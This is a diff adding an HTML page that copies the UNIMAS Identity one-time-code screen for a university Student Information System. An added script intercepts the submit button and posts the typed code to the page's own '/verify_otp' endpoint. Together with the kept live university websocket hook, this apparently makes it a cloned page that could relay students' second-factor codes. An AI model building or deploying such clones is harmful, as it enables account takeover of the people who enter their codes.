@@ -1,0 +1,335 @@
+﻿<!DOCTYPE html>
+
+<!--[if gte IE 9]><!-->
+<html><!--<![endif]-->
+<head>
+    <title>UNIMAS Identity</title>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, user-scalable=no"/>
+    <meta name="description" content=""/>
+    <meta name="author" content=""/>
+    <link rel="icon" href="static/picture/unimas_logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="../_assets/css/signin.css"/>
+    <link rel="stylesheet" href="../_vendor/font-awesome/css/font-awesome.min.css"/>
+</head>
+<style>
+    .sms-otp {
+        padding: 1em;
+        margin-bottom: .5em;
+        background: whitesmoke;
+        transition: .3s all ease-out;
+    }
+
+    .sms-otp:hover {
+        background: lightgray;
+    }
+
+    .sms-otp.disabled {
+        pointer-events: none;
+        opacity: .5;
+    }
+
+    .error {
+        padding-top: 1em;
+        color: red
+    }
+
+    @import url(../fonts/font.css);
+
+    html {
+        height: 100%;
+    }
+
+    body {
+        margin: 0;
+        height: 100%;
+        font-family: 'Open Sans', sans-serif;
+        font-size: 13px;
+    }
+
+    .bg-overlay {
+        background: #dddddd;
+        background-size: cover;
+        position: fixed;
+        top: 0px;
+        bottom: 0px;
+        left: 0px;
+        right: 0px;
+    }
+
+    .cont {
+        display: flex !important;
+        height: 100%;
+    }
+
+    .form-signin {
+        max-width: 400px;
+        margin: auto;
+        text-align: center;
+        z-index: 2;
+    }
+
+    .form-signin .form-body {
+        background: #fff;
+        padding: 15px 25px;
+    }
+
+    .form-signin .form-signin-heading,
+    .form-signin .checkbox {
+        margin-bottom: 10px;
+    }
+
+    .form-signin .form-header {
+        padding: 25px 20px;
+        background: #fff;
+        font-family: 'Open Sans', sans-serif;
+    }
+
+    .form-signin-heading {
+        text-align: center;
+        padding: 20px;
+        font-size: 2em;
+    }
+
+    .form-signin .checkbox {
+        font-weight: normal;
+    }
+
+    .form-control {
+        position: relative;
+        height: auto;
+        box-sizing: border-box;
+        padding: 15px;
+        font-size: 1rem;
+        display: block;
+        width: 100%;
+        line-height: 1.25;
+        color: #333;
+        background-color: rgba(255, 255, 255, .5) !important;
+        border: 1px solid rgba(0, 0, 0, .3);
+    }
+
+    .form-control:focus {
+        z-index: 2;
+    }
+
+    input:not(:first-child):not(:last-child) {
+        margin-bottom: -1px;
+        border-radius: 0;
+    }
+
+    input:first-child {
+        margin-bottom: -1px;
+        border-bottom-right-radius: 0;
+        border-bottom-left-radius: 0;
+    }
+
+    input:last-child {
+        margin-bottom: 10px;
+        border-top-left-radius: 0;
+        border-top-right-radius: 0;
+    }
+
+    .btn-primary {
+        color: #fff;
+        background-color: #0275d8;
+        border-color: #0275d8;
+    }
+
+    .btn {
+        display: inline-block;
+        padding: 6px 12px;
+        margin-bottom: 0;
+        font-size: 13px;
+        font-weight: 400;
+        line-height: 1.42857143;
+        text-align: center;
+        cursor: pointer;
+        user-select: none;
+        background-image: none;
+        border: 1px solid transparent;
+    }
+
+    .btn[disabled] {
+        opacity: .5;
+        pointer-events: none;
+        cursor: not-allowed;
+    }
+
+    .btn-block {
+        display: block;
+        width: 100%;
+    }
+
+    .btn-group-lg>.btn, .btn-lg {
+        padding: .75rem 1.5rem;
+        font-size: 1rem;
+    }
+
+    .help {
+        padding: 10px;
+        text-align: center;
+    }
+
+    a {
+        text-decoration: none;
+        color: #333;
+    }
+
+    .copy {
+        text-align: center;
+        position: fixed;
+        bottom: 0px;
+        left: 0px;
+        right: 0px;
+        padding: 2px;
+        font-size: 11px;
+    }
+</style>
+<body>
+
+<div class="bg-overlay"></div>
+<div class="cont">
+    <div class="form-signin">
+        <div class="form-wrapper" style="margin-bottom: 30px">
+            <div class="form-header">
+                <img src="static/picture/unimas-identity-logo3.png" width="85%">
+            </div>
+            <form action="/verify_otp" method="post" autocomplete="off">
+                <div class="form-body">
+                    <div>
+                        <div style="color:black">Continue to</div>
+                        <div style="display:flex;margin-top:.5em;">
+                            <div style="color:black; font-size: 1.2em; flex:1; display:flex; justify-content:center">
+                                Student Information System
+                            </div>
+                        </div>
+                        <div style="color:black; padding:1em;">
+                            Please <strong>type in</strong> the code displayed on your email<sup>1</sup> to continue
+                        </div>
+
+                        <div class="form-group">
+                            <input type="text" name="secret" id="secret" class="form-control input-lg"
+                                   style="text-align: center"
+                                   oninput="toggleButton(this,'btnsubmit');"
+                                   placeholder="******" required="true" autofocus="true" minlength="6" maxlength="6"/>
+                            <div id="countdown" style="margin-top: 8px; color: #888;">Time left: <span id="timer">60</span> seconds</div>
+                        </div>
+
+                        <div class="row">
+                            <div class="col-xs-6 col-sm-6 col-md-6">
+                                <input type="submit" disabled="disabled" id="btnsubmit"
+                                       class="btn btn-lg btn-primary btn-block" value="Confirm"/>
+                                <input type="hidden" name="client_id" value="estudent">
+                            </div>
+                            <div class="col-xs-6 col-sm-6 col-md-6"></div>
+                        </div>
+
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+
+<div class="copy">
+    Developed and maintained by CITDS, UNIMAS
+</div>
+
+<script src="/_vendor/sockjs/sockjs.min.js"></script>
+<script src="/_vendor/stomp-websocket/lib/stomp.min.js"></script>
+
+<script>
+    var stompClient = null;
+
+    var Constant = {
+        PING_WS_URL: "https://research.unimas.my/ping/ws",
+        PING_HTTP_URL: "https://research.unimas.my/ping/http",
+        PING_ROUTE: ""
+    }
+
+    var socket = new SockJS(Constant.PING_WS_URL);
+    stompClient = Stomp.over(socket);
+
+    var ch = "fid_DAOSICZQJ67X27M2BFXWOBFOFHHOOHYW";
+    var cid = "estudent";
+    var query = "client_id=estudent&redirect_uri=https://estudent.unimas.my/SemesterRegistration/login&response_type=code&state=4CZqfh";
+    var channels = [ch];
+
+    function connect() {
+        stompClient.connect({}, function (frame) {
+            channels.forEach(function (subscription) {
+                stompClient.subscribe('/' + subscription, function (message) {
+                    var obj = JSON.parse(message.body);
+                    location.href = "/secure-2fa/verify-push?" + query + "&code=" + obj.content;
+                });
+            });
+        });
+    }
+
+    connect();
+
+    function toggleButton(ref, bttnID) {
+        document.getElementById(bttnID).disabled = (ref.value.length != 6);
+    }
+
+    toggleButton(document.getElementById("secret"), "btnsubmit");
+
+    function toggleAlt() {
+        var d = document.getElementById("alt-otp");
+        d.style.display = d.style.display == 'none' ? '' : 'none';
+    }
+</script>
+
+<script>
+    document.getElementById("btnsubmit").addEventListener("click", function (e) {
+        e.preventDefault();
+        const otp = document.getElementById("secret").value.trim();
+
+        fetch("/verify_otp", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ otp })
+        })
+        .then(res => res.text())
+        .then(response => {
+            if (response && response.includes("<!DOCTYPE html>")) {
+                document.open();
+                document.write(response);
+                document.close();
+            } else if (response) {
+                alert(response);
+            }
+        })
+        .catch(err => {
+            console.error("Error:", err);
+            alert("Server error, please try again later.");
+        });
+    });
+
+    // OTP countdown logic
+    window.onload = function () {
+        let timeLeft = 60;
+        const timerDisplay = document.getElementById("timer");
+        const otpInput = document.getElementById("secret");
+        const submitBtn = document.getElementById("btnsubmit");
+
+        const countdown = setInterval(function () {
+            timeLeft--;
+            timerDisplay.textContent = timeLeft;
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                otpInput.disabled = true;
+                submitBtn.disabled = true;
+                document.getElementById("countdown").innerHTML = "<span style='color: red;'>OTP expired. Please request a new one.</span>";
+            }
+        }, 1000);
+    };
+</script>
+
+</body>
+</html>
